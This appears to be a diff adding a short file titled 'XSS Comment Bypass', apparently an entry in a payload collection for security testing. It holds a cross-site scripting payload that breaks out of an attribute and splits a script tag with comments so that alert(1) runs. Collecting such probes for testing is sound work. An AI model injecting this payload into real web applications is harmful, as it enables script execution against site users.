@@ -1,0 +1,5 @@
+XSS Comment Bypass
+
+"/><script>/*
+*/alert(1)/*
+*/</script>/*
